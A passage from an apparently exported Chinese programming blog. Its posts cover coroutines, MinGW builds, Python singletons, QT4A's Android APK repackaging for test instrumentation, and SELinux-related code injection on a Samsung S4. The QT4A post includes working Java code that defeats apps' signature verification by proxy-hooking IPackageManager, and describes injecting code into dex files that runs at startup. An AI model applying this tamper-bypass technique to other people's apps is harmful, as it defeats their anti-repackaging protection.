function sleep(ms) {
  return new Promise(resolve =&gt; setTimeout(resolve, ms));
}

async function async_sleep() {
    console.log(new Date());
    await sleep(2000);
    console.log(new Date());
}

async_sleep();

</code></pre>
<p>可以看出，这两种方式都可以实现协程的效果，但是后者是语言官方支持，应该会成为主流。</p>
<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>从上面的例子可以看出，两者对生成器和协程的使用有很多相似之处，可以说是大同小异。在理解了语言的这些特性之后，编写协程代码会更加地轻松。</p>
<p>总的来说就是：<code>语言都是相通的</code>。</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>Python中使用MinGW编译C++扩展</title>
    <url>/2017/05/02/python-mingw-install-extension/</url>
    <content><![CDATA[<p>Python中可以使用</p>
<blockquote>
<p>python setup.py build -c mingw32 install</p>
</blockquote>
<p>安装包含C++扩展的第三方库，但需要先安装<a href="http://www.mingw.org/" target="_blank" rel="noopener">MinGW</a> 5.1.4及以后版本，并将<code>C:\MinGW\bin</code>目录加入到环境变量。</p>
<h2 id="安装过程中可能会出现以下错误："><a href="#安装过程中可能会出现以下错误：" class="headerlink" title="安装过程中可能会出现以下错误："></a>安装过程中可能会出现以下错误：</h2><ul>
<li><strong>gcc: error: unrecognized command line option ‘-mno-cygwin’</strong><br>解决方法：修改<code>C:\Python27\Lib\distutils\cygwinccompiler.py</code>文件，去掉里面出现的<code>-mno-cygwin</code>  </li>
</ul>
<ul>
<li><p><strong>undefined reference to ‘_imp__PyExc_TypeError’</strong><br>解决方法： </p>
<ol>
<li>在MinGW中安装pexports工具  </li>
<li>执行命令 <code>pexports C:\Windows\SysWOW64\python27.dll &gt; python27.def</code>，在当前目录下生成python27.def文件</li>
<li>执行命令 <code>dlltool --dllname python27.dll --def python27.def --output-lib libpython27.a</code>，在当前目录下生成libpython27.a文件，并移动到<code>C:\Python27\libs</code>目录中</li>
</ol>
</li>
<li><p><strong>编译出的pyd无法加载</strong></p>
</li>
</ul>
<p>报错信息为：<code>ImportError: DLL load failed: 找不到指定的模块。</code>。</p>
<p>运行<code>ctypes.windll.kernel32.LoadLibraryA(pyd_path)</code>，报错如下：</p>
<p><img src="/images/mingw_load_error.png" alt></p>
<p>解决方法如下：</p>
<p>修改文件<code>C:\Python27\Lib\distutils\cygwinccompiler.py</code>，类<code>CygwinCCompiler</code>的构造函数中使用了如下逻辑：</p>
<pre><code class="python">        # ld_version &gt;= &quot;2.13&quot; support -shared so use it instead of
        # -mdll -static
        if self.ld_version &gt;= &quot;2.13&quot;:
            shared_option = &quot;-shared&quot;
        else:
            shared_option = &quot;-mdll -static&quot;
</code></pre>
<p>在高版本中默认使用了动态链接，强制改成静态链接，重新编译即可。</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>MinGW</tag>
      </tags>
  </entry>
  <entry>
    <title>Python中实现单例的N种方法</title>
    <url>/2019/11/19/python-singleton/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>单例是一种很常见的设计模式，在Python中不同的实现方法差异也比较大。这里介绍一些不同的实现方法。</p>
<h2 id="0x01-基本法"><a href="#0x01-基本法" class="headerlink" title="0x01 基本法"></a>0x01 基本法</h2><pre><code class="python">class MyClass(object):
    _instance = None

    @staticmethod
    def get_instance():
        if not MyClass._instance:
            MyClass._instance = MyClass()
        return MyClass._instance

inst = MyClass.get_instance()

</code></pre>
<p>这种方法是最简单的实现方法，但是需要使用者主动调用<code>get_instance</code>方法来获取实例，如果写成<code>inst = MyClass()</code>的话，就不会起到单例的作用了。</p>
<h2 id="0x02-重载new大法"><a href="#0x02-重载new大法" class="headerlink" title="0x02 重载new大法"></a>0x02 重载<strong>new</strong>大法</h2><p>为了解决上面的问题，可以通过重载<code>__new__</code>方法来实现。</p>
<pre><code class="python">class MyClass(object):
    _instance = None

    def __new__(cls, *args, **kwargs):
        if not cls._instance:
            cls._instance = super(MyClass, cls).__new__(cls, *args, **kwargs)
            cls._instance.initialize(*args, **kwargs)
        return cls._instance

    def initialize(self, *args, **kwargs):
        pass

inst = MyClass()
</code></pre>
<p>类在实例化的时候，会先调用<code>__new__</code>方法，在这里可以修改返回的实例。但是，这种方法有一个问题，就是实例化的时候一定会调用<code>__init__</code>方法，因此会出现重复初始化的问题。这里改为使用<code>initialize</code>方法进行初始化，也就是说，使用者需要避免使用<code>__init__</code>进行初始化。</p>
<p>但是这种方法对用户不是透明的，体验上不是很好。</p>
<h1 id="0x03-元类法"><a href="#0x03-元类法" class="headerlink" title="0x03 元类法"></a>0x03 元类法</h1><p>元类是一种特殊的类，它继承自<code>type</code>，拥有创造类的能力，因此成为<code>元类</code>。</p>
<pre><code class="python">
class SingletonMetaClass(type):

    def __init__(cls, *args, **kwargs):
        super(SingletonMetaClass, cls).__init__(*args, **kwargs)
        print(&#39;SingletonMetaClass __init__&#39;)

    def __call__(cls, *args, **kwargs):
        print(&#39;SingletonMetaClass __call__&#39;)
        if not hasattr(cls, &#39;_instance&#39;):
            cls._instance = super(SingletonMetaClass, cls).__call__(*args, **kwargs)
        print(&#39;SingletonMetaClass __call__ return&#39;)
        return cls._instance

class MyClass(object, metaclass=SingletonMetaClass):

    def __new__(cls, *args, **kwargs):
        print(&#39;MyClass __new__&#39;)
        return super(MyClass, cls).__new__(cls, *args, **kwargs)

    def __init__(self, *args, **kwargs):
        print(&#39;MyClass __init__&#39;)

inst = MyClass()
</code></pre>
<p>输出如下内容：</p>
<pre><code>SingletonMetaClass __init__
SingletonMetaClass __call__
MyClass __new__
MyClass __init__
SingletonMetaClass __call__ return
</code></pre><p>可以看出，正是在元类的<code>__call__</code>中，创造了<code>MyClass</code>这个类。</p>
<p>这种方法一般用来是没什么问题的，但是有些情况下会报：<code>TypeError: metaclass conflict: the metaclass of a derived class must be a (non-strict) subclass of the metaclasses of all its bases</code>这个错误。这是因为基类中也使用了元类的原因，此时需要保证元类的继承关系，以避免元类冲突。</p>
<h2 id="0x04-装饰器法"><a href="#0x04-装饰器法" class="headerlink" title="0x04 装饰器法"></a>0x04 装饰器法</h2><p>装饰器是一种常用的动态修改函数行为的方法，因此也可以用于实现单例。</p>
<pre><code class="python">class Singleton(object):
    &#39;&#39;&#39;singleton decorator
    &#39;&#39;&#39;

    def __init__(self, cls):
        self.__instance = None
        self.__cls = cls

    def __call__(self, *args, **kwargs):
        if not self.__instance:
            self.__instance = self.__cls(*args, **kwargs)
        return self.__instance

@Singleton
class MyClass(object):
    pass

</code></pre>
<p>相比其它方法，这种方法缺点更少，使用也更加灵活，不需要修改类的实现。</p>
<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>为了实现通用的单例逻辑，主要思路就是修改类的实例化过程。</p>
<p><code>__new__</code>方法、<code>元类法</code>、<code>装饰器法</code>都是通过在实例化之前判断是否已经实例化，从而返回对应的实例，差别只是在于实现逻辑位于实例化的不同阶段。<code>元类法</code>、<code>装饰器法</code>是通过在类实例化之前判断是否已经进行过实例化；而<code>__new__方法</code>是在已经进入实例化过程，但是尚未进到<code>__init__</code>过程，利用<code>__new__</code>函数可以改变返回实例的特点做到这一点。</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>singleton</tag>
      </tags>
  </entry>
  <entry>
    <title>QT4A重打包实现原理</title>
    <url>/2019/03/14/qt4a-repack-implementation/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>重打包是一种将非产品代码静态插入到安装包中，从而实现注入测试代码的能力。这种技术可以用于非root手机上无法利用<code>ptrace</code>动态注入被测进程的场景。</p>
<p>除此之外，还可以修改安装包的属性，例如将<code>release</code>包改为<code>debug</code>包等。</p>
<p>重打包需要解决的问题主要有：</p>
<ul>
<li>如何修改<code>AndroidManifest.xml</code>文件</li>
<li>如何将自己的代码插入到<code>dex</code>中</li>
<li>如何让自己的代码逻辑优先执行</li>
<li>如何绕过应用的签名校验逻辑</li>
</ul>
<p>只有完美解决这几个问题，才能真正实现重打包。</p>
<h2 id="0x01-如何修改AndroidManifest-xml文件"><a href="#0x01-如何修改AndroidManifest-xml文件" class="headerlink" title="0x01 如何修改AndroidManifest.xml文件"></a>0x01 如何修改<code>AndroidManifest.xml</code>文件</h2><p><code>AndroidManifest.xml</code>文件是安装包中一个非常重要的文件，它记录了应用实现的所有<code>Activity</code>、<code>Service</code>、<code>ContentProvider</code>等组件，以及应用入口、应用属性、权限申明等信息。所以，要实现重打包，必然会需要修改这个文件。</p>
<p>事实上，<code>AndroidManifest.xml</code>并不是xml格式，而是<code>Android binary XML（AXML）</code>格式，这是一种二进制格式，可以使用<code>androguard</code>等工具进行解析，具体格式内容可以参考<a href="https://www.2cto.com/kf/201607/523543.html" target="_blank" rel="noopener">该文</a>。</p>
<p>不过，QT4A是自己实现了一套解析和生成的逻辑，只要了解清楚每个字段的含义，实现起来并不是很复杂。</p>
<h2 id="0x02-如何将release包变成debug包"><a href="#0x02-如何将release包变成debug包" class="headerlink" title="0x02 如何将release包变成debug包"></a>0x02 如何将<code>release</code>包变成<code>debug</code>包</h2><p>发布版本的安装包，一定是<code>release</code>包，这是为了避免安全风险。而将安装包转变为<code>debug</code>包，不仅可以对安装包进行调试，还可以获取到很多之前没法获取到的数据。</p>
<p>决定一个安装包是否是debug包，是根据<code>AndroidManifest.xml</code>文件中的<code>application</code>标签的<code>android:debuggable</code>属性值来判断的。</p>
<p>因此，只要将这个字段修改为<code>true</code>即可。</p>
<h2 id="0x03-如何绕过应用的签名校验逻辑"><a href="#0x03-如何绕过应用的签名校验逻辑" class="headerlink" title="0x03 如何绕过应用的签名校验逻辑"></a>0x03 如何绕过应用的签名校验逻辑</h2><p>为了避免应用被二次打包，现在很多应用都有签名校验逻辑，发现不是自己的签名，就直接退出。</p>
<p>网上也有这方面的对抗，例如<a href="https://bbs.pediy.com/thread-206742.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-206742.htm</a>这篇文章就是通过逆向，来破解掉应用的签名验证逻辑。</p>
<h3 id="绕过原理分析"><a href="#绕过原理分析" class="headerlink" title="绕过原理分析"></a>绕过原理分析</h3><p>为了实现更简单的绕过逻辑，先来了解下应用是如何进行签名验证的，以下是一段最简单的Java层实现。</p>
<pre><code class="java">public static boolean verifySignature(Context context, int expectHash) {
    PackageManager pm = context.getPackageManager();
    PackageInfo pi;
    StringBuilder sb = new StringBuilder();

    try {
        pi = pm.getPackageInfo(context.getPackageName(), PackageManager.GET_SIGNATURES);
        Signature[] signatures = pi.signatures;
        for (Signature signature : signatures) {
            sb.append(signature.toCharsString());
        }
    } catch (PackageManager.NameNotFoundException e) {
        e.printStackTrace();
        return false;
    }
    return sb.toString().hashCode() == expectHash;
}
</code></pre>
<p>主要思路就是使用<code>getPackageInfo</code>接口获取应用的签名，然后和期望值进行对比。为了增加逆向的难度，很多应用会将这部分实现放到native层，但原理还是通过反射来调用这个函数。</p>
<p>那么，一个通用的绕过签名校验逻辑的方法，就是Hook <code>getPackageInfo</code>函数，发现应用要获取签名的时候，把原始签名内容丢给应用即可。</p>
<p>常见的Hook方法一般都是在native层实现的，但是这种方法的兼容性不是很好。事实上，该函数还可以使用<code>动态代理</code>的方法来实现Hook。</p>
<blockquote>
<p>动态代理是一种在运行过程中动态生成代理类的方法，它可以使用很少量的代码，实现对被调用方法的拦截和处理。</p>
</blockquote>
<p>但是，它有个缺点：只能针对接口创建代理。因此，只在部分场景中可以使用该方法。</p>
<p>来分析下为什么这里可以使用动态代理？</p>
<p>先来看<code>Context.getPackageManager</code>函数的实现：</p>
<pre><code class="java">@Override
public PackageManager getPackageManager() {
    if (mPackageManager != null) {
        return mPackageManager;
    }

    IPackageManager pm = ActivityThread.getPackageManager();
    if (pm != null) {
        // Doesn&#39;t matter if we make more than one instance.
        return (mPackageManager = new ApplicationPackageManager(this, pm));
    }

    return null;
}
</code></pre>
<p>这里实际上是调用了<code>ActivityThread.getPackageManager()</code>函数。</p>
<pre><code class="java">public static IPackageManager getPackageManager() {
    if (sPackageManager != null) {
        //Slog.v(&quot;PackageManager&quot;, &quot;returning cur default = &quot; + sPackageManager);
        return sPackageManager;
    }
    IBinder b = ServiceManager.getService(&quot;package&quot;);
    //Slog.v(&quot;PackageManager&quot;, &quot;default service binder = &quot; + b);
    sPackageManager = IPackageManager.Stub.asInterface(b);
    //Slog.v(&quot;PackageManager&quot;, &quot;default service = &quot; + sPackageManager);
    return sPackageManager;
}
</code></pre>
<p>由于该函数会在应用的<code>Application</code>类构造之前就被调用，因此，<code>sPackageManager</code>字段正常情况下都不为空。注意到该函数的返回值是<code>IPackageManager</code>类型，这正是一个可以使用动态代理的场景。</p>
<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><h4 id="实现InvocationHandler接口，在invoke中判断是否是目标调用，并修改返回值"><a href="#实现InvocationHandler接口，在invoke中判断是否是目标调用，并修改返回值" class="headerlink" title="实现InvocationHandler接口，在invoke中判断是否是目标调用，并修改返回值"></a>实现InvocationHandler接口，在<code>invoke</code>中判断是否是目标调用，并修改返回值</h4><pre><code class="java">public class PmsHookBinderInvocationHandler implements InvocationHandler{
    private static String TAG = &quot;PmsHookBinderInvocationHandler&quot;;

    private Object base;

    //应用正确的签名信息
    private String SIGN;
    private String appPkgName = &quot;&quot;;

    public PmsHookBinderInvocationHandler(Object base, String sign, String appPkgName){
        this.base = base;
        this.SIGN = sign;
        this.appPkgName = appPkgName;
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) {
        Log.i(TAG, &quot;call &quot; + method.getName());
        try{
            if(&quot;getPackageInfo&quot;.equals(method.getName())){
                String pkgName = (String)args[0];
                Integer flag = (Integer)args[1];
                if(flag == PackageManager.GET_SIGNATURES &amp;&amp; appPkgName.equals(pkgName){
                    Log.i(TAG, &quot;GET_SIGNATURES: &quot; + SIGN);
                    Signature sign = new Signature(SIGN);
                    PackageInfo info = (PackageInfo) method.invoke(base, args);
                    info.signatures[0] = sign;
                    return info;
                }
            }
            return method.invoke(base, args);
        }catch(Exception e){
            e.printStackTrace();
            return null;
        }
    }
}
</code></pre>
<h4 id="创建Proxy对象"><a href="#创建Proxy对象" class="headerlink" title="创建Proxy对象"></a>创建<code>Proxy</code>对象</h4><pre><code class="java">Class&lt;?&gt; activityThreadClass = Class.forName(&quot;android.app.ActivityThread&quot;);
Method currentActivityThreadMethod = 
        activityThreadClass.getDeclaredMethod(&quot;currentActivityThread&quot;);
Object currentActivityThread = currentActivityThreadMethod.invoke(null);
// 获取ActivityThread里面原始的sPackageManager
Field sPackageManagerField = activityThreadClass.getDeclaredField(&quot;sPackageManager&quot;);
sPackageManagerField.setAccessible(true);
Object sPackageManager = sPackageManagerField.get(currentActivityThread);
Class&lt;?&gt; iPackageManagerInterface = Class.forName(&quot;android.content.pm.IPackageManager&quot;);
Object proxy = Proxy.newProxyInstance(
    iPackageManagerInterface.getClassLoader(),
    new Class&lt;?&gt;[] { iPackageManagerInterface },
    new PmsHookBinderInvocationHandler(sPackageManager, origSign, getContext().getPackageName()));
</code></pre>
<p><code>origSign</code>为原始签名字符串</p>
<h4 id="替换sPackageManager字段的值"><a href="#替换sPackageManager字段的值" class="headerlink" title="替换sPackageManager字段的值"></a>替换<code>sPackageManager</code>字段的值</h4><pre><code class="java">sPackageManagerField.set(currentActivityThread, proxy);
</code></pre>
<h4 id="为了避免在Hook前调用过getPackageManager，导致实例化过ApplicationPackageManager类，需要修改ApplicationPackageManager对象中保存的IPackageManager实例"><a href="#为了避免在Hook前调用过getPackageManager，导致实例化过ApplicationPackageManager类，需要修改ApplicationPackageManager对象中保存的IPackageManager实例" class="headerlink" title="为了避免在Hook前调用过getPackageManager，导致实例化过ApplicationPackageManager类，需要修改ApplicationPackageManager对象中保存的IPackageManager实例"></a>为了避免在Hook前调用过<code>getPackageManager</code>，导致实例化过<code>ApplicationPackageManager</code>类，需要修改<code>ApplicationPackageManager</code>对象中保存的<code>IPackageManager</code>实例</h4><pre><code class="java">ApplicationPackageManager(ContextImpl context,
                            IPackageManager pm) {
    mContext = context;
    mPM = pm;
}
</code></pre>
<p>根据以上代码可以看出，这是保存在<code>mPM</code>字段中的。</p>
<pre><code class="java">PackageManager pm = getContext().getPackageManager();
Field mPmField = pm.getClass().getDeclaredField(&quot;mPM&quot;);
mPmField.setAccessible(true);
mPmField.set(pm, proxy);
</code></pre>
<p>至此，Hook逻辑已经实现，但问题是，如何在应用进行签名校验之前加载这段代码呢？</p>
<h2 id="0x04-实现静态插桩逻辑"><a href="#0x04-实现静态插桩逻辑" class="headerlink" title="0x04 实现静态插桩逻辑"></a>0x04 实现静态插桩逻辑</h2><h3 id="常见的静态插桩方案"><a href="#常见的静态插桩方案" class="headerlink" title="常见的静态插桩方案"></a>常见的静态插桩方案</h3><p>目前，常见的静态插桩方案，基本上都是通过将<code>dex</code>文件反编译成<code>Smali</code>代码或<code>class</code>字节码，然后插入自己的逻辑，再重新编译成dex文件。这种方法成本相对来说较高，如果产品加入了反编译逻辑，可能会导致反编译失败，或者是插桩后的应用无法正常运行，不太适合自动化操作。</p>
<p>另外有一种方法是使用了应用加固的思想，通过替换应用的<code>classes.dex</code>文件，实现在运行时将原始的<code>classes.dex</code>解压出来并加载。这种方法需要实现一个<code>Application</code>子类，重写<code>attachBaseContext</code>函数，在该函数里实现解压和加载的逻辑，并将解压出来的dex加入到<code>ClassLoader</code>中，以保证系统可以正常获取应用中的类；同时，还要实例化应用原先定义的<code>Application</code>类，并替换所有持有<code>Application</code>类实例的地方。</p>
<p>这种方法有个问题，在应用首次运行的时候，需要进行dex解压和优化的操作，如果dex很大，该步操作会很耗时，导致启动黑屏，影响用户体验。而且，该方法在测试过程中，发现容易导致各种奇奇怪怪的异常，排查起来很花时间。</p>
<p>此时，还想到另外一种方法，先将我们的类插入到<code>dex</code>中，然后通过某种机制将其运行起来就可以了。</p>
<h3 id="插入类到dex"><a href="#插入类到dex" class="headerlink" title="插入类到dex"></a>插入类到<code>dex</code></h3><p>在dex中添加类，不一定非要将dex进行反编译之类的操作，是否可以通过合并两个dex来实现呢？</p>
<p>经过Google后发现，<a href="http://androidxref.com/5.0.0_r2/xref/dalvik/dx/src/com/android/dx/merge/DexMerger.java" target="_blank" rel="noopener">Android源码</a>中已经提供了合并dex的功能。</p>
<pre><code class="java">public static void main(String[] args) throws IOException {
    if (args.length &lt; 2) {
        printUsage();
        return;
    }

    Dex merged = new Dex(new File(args[1]));
    for (int i = 2; i &lt; args.length; i++) {
        Dex toMerge = new Dex(new File(args[i]));
        merged = new DexMerger(merged, toMerge, CollisionPolicy.KEEP_FIRST).merge();
    }
    merged.writeTo(new File(args[0]));
}

private static void printUsage() {
    System.out.println(&quot;Usage: DexMerger &lt;out.dex&gt; &lt;a.dex&gt; &lt;b.dex&gt; ...&quot;);
    System.out.println();
    System.out.println(
        &quot;If a class is defined in several dex, the class found in the first dex will be used.&quot;);
}
</code></pre>
<p>这部分代码已经集成在了Android SDK的<code>dx.jar</code>文件中，但是我没有找到命令行执行入口，但是可以通过将<code>META-INF/MANIFEST.MF</code>文件中的<code>Main-Class: com.android.dx.command.Main</code>替换为<code>Main-Class: com.android.dx.merge.DexMerger</code>，就可以使用命令行<code>java -jar dx.jar &lt;out.dex&gt; &lt;a.dex&gt; &lt;b.dex&gt; ...</code>来合并dex。</p>
<p>尝试将手Q中的两个dex进行合并，却发现报错了：</p>
<pre><code>Exception in thread &quot;main&quot; com.android.dex.DexIndexOverflowException: field ID not in [0, 0xffff]: 65536
    at com.android.dx.merge.DexMerger$5.updateIndex(DexMerger.java:479)
    at com.android.dx.merge.DexMerger$IdMerger.mergeSorted(DexMerger.java:283)
    at com.android.dx.merge.DexMerger.mergeFieldIds(DexMerger.java:468)
    at com.android.dx.merge.DexMerger.mergeDexes(DexMerger.java:167)
    at com.android.dx.merge.DexMerger.merge(DexMerger.java:189)
    at com.android.dx.merge.DexMerger.main(DexMerger.java:1122)
</code></pre><p>这是因为dex中的字段数不能超过<code>65536</code>的限制，方法数也会受该限制的影响。正因为如此，很多大型应用都需要进行dex分包，将初始化时需要用到的类放到<code>classes.dex</code>中，其它类放到次dex中，并在运行的时候动态加载进来。</p>
<h3 id="绕过方法数限制"><a href="#绕过方法数限制" class="headerlink" title="绕过方法数限制"></a>绕过方法数限制</h3><p>一般来说，分包逻辑并不会正好占用到字段数和方法数的上限，而是留有一定的空间。因此，只要合并的dex非常小，是不会超过上限的。</p>
<p>实现一个最简单的ContentProvider类后，编译为dex，并进行合并，竟然还是会报错。</p>
<pre><code>Exception in thread &quot;main&quot; com.android.dex.DexIndexOverflowException: Cannot merge new index 92177 into a non-jumbo instruction!
    at com.android.dx.merge.InstructionTransformer.jumboCheck(InstructionTransformer.java:109)
    at com.android.dx.merge.InstructionTransformer.access$800(InstructionTransformer.java:26)
    at com.android.dx.merge.InstructionTransformer$StringVisitor.visit(InstructionTransformer.java:72)
    at com.android.dx.io.CodeReader.callVisit(CodeReader.java:114)
    at com.android.dx.io.CodeReader.visitAll(CodeReader.java:89)
    at com.android.dx.merge.InstructionTransformer.transform(InstructionTransformer.java:49)
    at com.android.dx.merge.DexMerger.transformCode(DexMerger.java:842)
    at com.android.dx.merge.DexMerger.transformMethods(DexMerger.java:813)
    at com.android.dx.merge.DexMerger.transformClassData(DexMerger.java:785)

    at com.android.dx.merge.DexMerger.transformClassDef(DexMerger.java:682)
    at com.android.dx.merge.DexMerger.mergeClassDefs(DexMerger.java:542)
    at com.android.dx.merge.DexMerger.mergeDexes(DexMerger.java:171)
    at com.android.dx.merge.DexMerger.merge(DexMerger.java:189)
    at com.android.dx.merge.DexMerger.main(DexMerger.java:1122)
</code></pre><p>网上的解决方法一般如下：</p>
<blockquote>
<p>使用Gradle构建的，在模块的build.gradle里配置：</p>
</blockquote>
<pre><code class="gradle">    android {  
      dexOptions {  
          jumboMode true  
      }  
    }  
</code></pre>
<blockquote>
<p>如果是使用Eclipse+Ant构建的，在project.properties文件中增加如下配置：</p>
</blockquote>
<pre><code class="json">dex.force.jumbo=true
</code></pre>
<p>使用<code>dx</code>命令生成dex时，也可以通过加入<code>--force-jumbo</code>参数来开启jumbo模式。</p>
<p>再次执行合并就可以成功了。</p>
<p>反编译生成的dex，发现我们的类的确出现在了dex里面。</p>
<h2 id="0x05-如何尽早执行插入的代码"><a href="#0x05-如何尽早执行插入的代码" class="headerlink" title="0x05 如何尽早执行插入的代码"></a>0x05 如何尽早执行插入的代码</h2><p>通过dex合并方案插入的类，此时并没有任何调用时机。也就是说，它们现在就是段<code>死代码</code>，完全不会被执行。那么，如何可以让它们执行，并且是在非常早的时机运行呢（需要早于应用的签名校验逻辑）？</p>
<h3 id="利用ContentProvider执行代码"><a href="#利用ContentProvider执行代码" class="headerlink" title="利用ContentProvider执行代码"></a>利用<code>ContentProvider</code>执行代码</h3><p>在调试过程中，我偶然发现如果应用定义了<code>ContentProvider</code>组件，<code>ActivityThread</code>类会在<code>handleBindApplication</code>中自动安装这些组件，并调用<code>onCreate</code>方法，这个时机甚至是早于<code>Application</code>的<code>onCreate</code>调用。</p>
<pre><code class="java">// don&#39;t bring up providers in restricted mode; they may depend on the
// app&#39;s custom Application class
if (!data.restrictedBackupMode) {
    List&lt;ProviderInfo&gt; providers = data.providers;
    if (providers != null) {
        installContentProviders(app, providers);
        // For process that contains content providers, we want to
        // ensure that the JIT is enabled &quot;at some point&quot;.
        mH.sendEmptyMessageDelayed(H.ENABLE_JIT, 10*1000);
    }
}
</code></pre>
<p>由此可见，这倒是一个绝佳的插入时机。下面是调用到<code>ReadInJoyDataProvider</code>类的<code>onCreate</code>函数时的调用堆栈。</p>
<pre><code>01-12 09:59:28.236: D/DexloaderApplication(14615):     at cooperation.readinjoy.content.ReadInJoyDataProvider.onCreate(ReadInJoyDataProvider.java:106)
01-12 09:59:28.236: D/DexloaderApplication(14615):     at android.content.ContentProvider.attachInfo(ContentProvider.java:1686)
01-12 09:59:28.236: D/DexloaderApplication(14615):     at android.content.ContentProvider.attachInfo(ContentProvider.java:1655)
01-12 09:59:28.236: D/DexloaderApplication(14615):     at android.app.ActivityThread.installProvider(ActivityThread.java:4964)
01-12 09:59:28.236: D/DexloaderApplication(14615):     at android.app.ActivityThread.installContentProviders(ActivityThread.java:4559)
01-12 09:59:28.236: D/DexloaderApplication(14615):     at android.app.ActivityThread.handleBindApplication(ActivityThread.java:4499)
01-12 09:59:28.236: D/DexloaderApplication(14615):     at android.app.ActivityThread.access$1500(ActivityThread.java:144)
01-12 09:59:28.236: D/DexloaderApplication(14615):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1339)
01-12 09:59:28.236: D/DexloaderApplication(14615):     at android.os.Handler.dispatchMessage(Handler.java:102)
01-12 09:59:28.236: D/DexloaderApplication(14615):     at android.os.Looper.loop(Looper.java:135)
01-12 09:59:28.236: D/DexloaderApplication(14615):     at android.app.ActivityThread.main(ActivityThread.java:5221)
01-12 09:59:28.236: D/DexloaderApplication(14615):     at java.lang.reflect.Method.invoke(Native Method)
01-12 09:59:28.236: D/DexloaderApplication(14615):     at java.lang.reflect.Method.invoke(Method.java:372)
01-12 09:59:28.236: D/DexloaderApplication(14615):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:899)
01-12 09:59:28.236: D/DexloaderApplication(14615):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:694)
</code></pre><p>因此，只要在<code>AndroidManifest.xml</code>文件中的<code>application</code>节点下插入一个<code>provider</code>节点，在<code>android:name</code>中指定好类名，就可以在应用初始化时加载我们的代码。</p>
<pre><code class="xml">&lt;provider android:authorities=&quot;test&quot; android:name=&quot;com.test.androidspy.inject.DexLoaderContentProvider&quot; /&gt;
</code></pre>
<h3 id="多进程支持"><a href="#多进程支持" class="headerlink" title="多进程支持"></a>多进程支持</h3><p>现在定义的ContentProvider只会在主进程里加载，要支持其它进程，需要每个进程创建一个对应的<code>provider</code>。</p>
<pre><code class="xml">&lt;provider android:authorities=&quot;test1&quot; android:name=&quot;com.test.androidspy.inject.DexLoaderContentProvider$InnerClass1&quot; android:process=&quot;:MSF&quot;/&gt;
</code></pre>
<p>但是，需要注意的是，<code>name</code>和<code>authorities</code>都必须保证唯一性，因此，需要提供和进程总数一致的类的数量。</p>
<h2 id="0x06-加载真正的dex"><a href="#0x06-加载真正的dex" class="headerlink" title="0x06 加载真正的dex"></a>0x06 加载真正的dex</h2><p>按照之前的介绍，实现的ContentProvider类中只能实现少量的功能。如果要执行更多逻辑，需要放在单独的dex中，然后动态加载进来。例如，加载QT4A的应用测试桩，可以使用如下方法：</p>
<pre><code class="java">/*
    * 加载QT4A测试桩
    */
private void loadQT4ADriver(String dexPath){
    int pid = android.os.Process.myPid();
    String processName = &quot;&quot;;
    ActivityManager manager = (ActivityManager) getContext().getSystemService(Context.ACTIVITY_SERVICE);
    for (ActivityManager.RunningAppProcessInfo process: manager.getRunningAppProcesses()) {
        if(process.pid == pid){
            processName = process.processName;
        }
    }
    DexClassLoader cl = new DexClassLoader(dexPath, getContext().getCacheDir().getAbsolutePath(), null, ClassLoader.getSystemClassLoader());   
    try{
        Class&lt;?&gt; entryClass = Class.forName(&quot;com.test.androidspy.ActivityInspect&quot;, true, cl);
        Method run = entryClass.getDeclaredMethod(&quot;run&quot;, String.class);
        run.invoke(entryClass, processName);
    }catch(Exception e){
        e.printStackTrace();
    }
}
</code></pre>
<p>这种方法可以解决像三星等手机中遇到的无法使用<code>run-as</code>命令切换到debug应用的uid，从而无法注入的问题。</p>
<h2 id="0x07-重签名"><a href="#0x07-重签名" class="headerlink" title="0x07 重签名"></a>0x07 重签名</h2><p>对安装包进行任何修改后，都需要进行重签名才能正常安装到Android系统中。因此，最后还需要使用自己的签名对安装包进行重签名。不过，由于这步操作比较简单，网上教程较多，这里就不细说了。</p>
<h2 id="0x08-方案总结"><a href="#0x08-方案总结" class="headerlink" title="0x08 方案总结"></a>0x08 方案总结</h2><p>对应用进行重打包的主要步骤如下：</p>
<ol>
<li>修改<code>AndroidManifest.xml</code>，将<code>android:debuggable</code>设为<code>true</code></li>
<li>为所有进程增加<code>provider</code>入口</li>
<li>合并<code>classes.dex</code>，加入<code>ContentProvider</code>子类</li>
<li>将原始签名信息和测试桩文件放到<code>assets</code>目录，在<code>ContentProvider</code>子类中会读取这些文件</li>
<li>重签名</li>
</ol>
<p>经过测试，对于大部分常见应用都可以实现完美的重打包，重打包后的应用可以正常运行，并且绕过了应用的签名校验机制，安装包也成功地从release包变成了debug包，测试桩也会在进程启动时自动运行。</p>
<p>具体代码可以参考：<a href="https://github.com/Tencent/QT4A/blob/master/qt4a/apktool/repack.py" target="_blank" rel="noopener">https://github.com/Tencent/QT4A/blob/master/qt4a/apktool/repack.py</a></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>qt4a</tag>
      </tags>
  </entry>
  <entry>
    <title>三星S4无法注入的处理</title>
    <url>/2017/01/07/samsung-s4-inject/</url>
    <content><![CDATA[<p>三星S4，4.4系统，selinux无法关闭  </p>
<p>注入时发现dlopen调用返回为0，怀疑是selinux的原因。研究后发现加载的so的context不能是<strong>u:object_r:shell_data_file:s0</strong>，使用chcon命令改为<strong>u:object_r:app_data_file:s0</strong>或<strong>u:object_r:system_file:s0</strong>，注入成功</p>
